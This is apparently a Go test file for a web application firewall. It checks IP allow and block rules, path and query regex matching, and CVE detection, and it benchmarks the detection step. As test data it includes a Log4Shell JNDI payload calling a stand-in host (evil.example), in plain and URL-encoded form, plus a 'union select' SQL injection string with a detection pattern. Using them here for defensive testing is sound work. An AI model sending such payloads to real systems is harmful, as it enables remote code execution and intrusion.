package rules

import (
	"net"
	"testing"

	"My-OpenWaf/internal/core/action"
	"My-OpenWaf/internal/core/pipeline"
	"My-OpenWaf/internal/store"
	"My-OpenWaf/internal/waf/cve"
)

var benchmarkCVEPhaseResult action.Result
var benchmarkCVEPhaseStop bool

func TestCompileAndMatchBlockIP(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseACL, Pattern: "block_ip:192.168.1.0/24", Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1 compiled rule, got %d", len(compiled))
	}
	ctx := MatchCtx{ClientIP: net.ParseIP("192.168.1.50")}
	if !compiled[0].Match(ctx) {
		t.Fatal("expected match for 192.168.1.50")
	}
	ctx2 := MatchCtx{ClientIP: net.ParseIP("10.0.0.1")}
	if compiled[0].Match(ctx2) {
		t.Fatal("should not match 10.0.0.1")
	}
}

func TestCompileAndMatchAllowIP(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseACL, Pattern: "allow_ip:10.0.0.1", Action: store.ActionAllow, Enabled: true, Priority: 1},
		{Phase: store.PhaseACL, Pattern: "block_ip:0.0.0.0/0", Action: store.ActionIntercept, Enabled: true, Priority: 10},
	}
	compiled := Compile(rules)
	if len(compiled) != 2 {
		t.Fatalf("expected 2 rules, got %d", len(compiled))
	}
	// allow_ip has lower priority → evaluated first
	ctx := MatchCtx{ClientIP: net.ParseIP("10.0.0.1")}
	if !compiled[0].Match(ctx) {
		t.Fatal("allow should match")
	}
	if action.Normalize(compiled[0].Action) != action.Allow {
		t.Fatal("first rule should be allow")
	}
}

func TestCompilePathRegex(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseSignature, Pattern: "block_path_regex:(?i)/admin", Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Path: "/Admin/dashboard"}) {
		t.Fatal("should match case-insensitive")
	}
	if compiled[0].Match(MatchCtx{Path: "/api/v1"}) {
		t.Fatal("should not match /api/v1")
	}
}

func TestCompileQueryRegex(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseCustom, Pattern: "block_query_regex:(?i)union\\s+select", Action: store.ActionIntercept, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	if len(compiled) != 1 {
		t.Fatalf("expected 1, got %d", len(compiled))
	}
	if !compiled[0].Match(MatchCtx{Query: "id=1 UNION SELECT 1"}) {
		t.Fatal("should match union select")
	}
}

func TestMixedRulePriority(t *testing.T) {
	rules := []store.Rule{
		{Phase: store.PhaseACL, Pattern: "block_ip:0.0.0.0/0", Action: store.ActionIntercept, Enabled: true, Priority: 100},
		{Phase: store.PhaseACL, Pattern: "allow_ip:10.0.0.0/8", Action: store.ActionAllow, Enabled: true, Priority: 1},
	}
	compiled := Compile(rules)
	// Priority 1 should come first
	if compiled[0].Kind != "allow_ip" {
		t.Fatalf("expected allow_ip first, got %s", compiled[0].Kind)
	}
}

func TestCVEDetectorRuleOverridePreventsAutoDrop(t *testing.T) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	cfg.CVEAction = "intercept"
	cfg.CVEAutoDropCritical = true
	cfg.CVEAutoDropHigh = true
	cfg.CVERulesConfig = `{"CVE-2021-44228":{"action":"rate_limit"}}`

	phase := &cvePhase{cfg: &cfg, detector: cve.NewCVEDetector()}
	result, stop := phase.Execute(&pipeline.RequestCtx{
		Path:     "/",
		RawQuery: "x=${jndi:ldap://evil.example/a}",
		Headers:  map[string]string{},
	})
	if !stop {
		t.Fatal("expected CVE hit to stop the pipeline")
	}
	if result.Type != action.RateLimit {
		t.Fatalf("expected explicit rule action to win, got %q", result.Type)
	}
	if result.ResponseStatusCode() != 429 {
		t.Fatalf("expected rate limit status 429, got %d", result.ResponseStatusCode())
	}
}

func TestNewCVEPhaseCachesRuntimeConfig(t *testing.T) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	cfg.CategorySensitivity = `{"cve_general":"off"}`
	cfg.CVERulesConfig = `{"CVE-2021-44228":{"action":"rate_limit","status_code":429,"redirect_to":"/blocked"}}`

	phase := NewCVEPhase(&cfg, cve.NewCVEDetector()).(*cvePhase)
	if !phase.cachedConfig {
		t.Fatal("expected CVE phase config cache to be initialized")
	}
	if got := phase.categorySensitivity["cve_general"]; got != "off" {
		t.Fatalf("expected cached cve_general sensitivity off, got %q", got)
	}
	override, ok := phase.ruleOverrides["CVE-2021-44228"]
	if !ok {
		t.Fatal("expected cached CVE rule override")
	}
	if override.Action != "rate_limit" || override.StatusCode != 429 || override.RedirectTo != "/blocked" {
		t.Fatalf("unexpected cached override: %#v", override)
	}
}

func BenchmarkCVEPhaseCleanTraffic(b *testing.B) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	phase := NewCVEPhase(&cfg, cve.NewCVEDetector()).(*cvePhase)
	ctx := &pipeline.RequestCtx{
		Path:        "/api/login",
		RawQuery:    "page=1&sort=name",
		Headers:     map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Host": "example.com", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"},
		Body:        []byte(`{"username":"admin","password":"test123"}`),
		ContentType: "application/json",
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkCVEPhaseResult, benchmarkCVEPhaseStop = phase.Execute(ctx)
	}
}

func BenchmarkCVEPhaseLog4ShellTraffic(b *testing.B) {
	cfg := store.DefaultProtectionConfig()
	cfg.CVEEnabled = true
	phase := NewCVEPhase(&cfg, cve.NewCVEDetector()).(*cvePhase)
	ctx := &pipeline.RequestCtx{
		Path:     "/",
		RawQuery: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D",
		Headers:  map[string]string{},
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkCVEPhaseResult, benchmarkCVEPhaseStop = phase.Execute(ctx)
	}
}
